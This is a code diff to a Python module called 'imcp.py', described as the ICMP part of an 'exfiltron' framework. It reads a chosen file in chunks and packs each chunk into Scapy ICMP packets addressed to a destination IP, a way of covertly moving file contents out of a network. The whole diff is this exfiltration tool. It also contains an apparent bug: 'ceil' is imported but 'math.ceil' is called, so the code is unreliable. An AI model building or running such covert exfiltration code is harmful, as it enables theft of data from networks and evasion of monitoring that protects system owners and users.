@@ -1,23 +1,25 @@
 """
-* imcp.py
-*
-*
+* File: imcp.py
+* Authors: Andrew Steiner, Thomas Daniels
+* Purpose: This is the ICMP module to the exfiltron framework. Its purpose is
+        to create the list of packets needed by the send function in exfiltron
+        using ICMP as the method of exfiltration.
 """
 
 from scapy.all import*
 import os
 import sys
-
-#  icmp: args: destinationIP(string), filename(str), BytesPerPacket(int)
-#  rtn: list of packets
+from math import ceil
 
 def icmp(destIP, filename, BytesPP):
+    """
+    args: destinationIP(str), filename(str), BytesPerPacket(int)
+    return: list of packets
+    """
     READ_ONLY = 'r'
     listOfPackets = []
-    size = 0
-    numPackets=0
-    dataPP=BytesPP-1
 
+    # TODO: make sure minICMP size <= BytesPP <= MTU
    
     # size is the number of bytes in the file
     try:
@@ -27,21 +29,19 @@ def icmp(destIP, filename, BytesPP):
         print("Exiting...")
         sys.exit()
     
-    #if size > 
-    # the number of packets send should be the size of the
+    # the number of packets to send should be the size of the
     # file divided by the number of bytes per packet
-    numPackets = size/BytesPP 
+    numPackets = int(math.ceil(size / float(BytesPP)))
     
-  
     # opening the specified file **needs error handling**
     OFile = open(filename, READ_ONLY)  
  
-    #need to work on the for loop
+    # Read the specified amount of data from the file, append it to the packet
+    # and add the packet to the list of packets to send
     for i in range(numPackets):
-        partOfFile=OFile.read(dataPP)
-        data = str(i) + partOfFile
-        packet=sr(IP(dst=destIP)/ICMP()/partOfFile)
-        print(i)
-    
-    
-    file.close()
+        OFile.seek(i*BytesPP)
+        listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))
+
+    OFile.close()
+
+    return listOfPackets
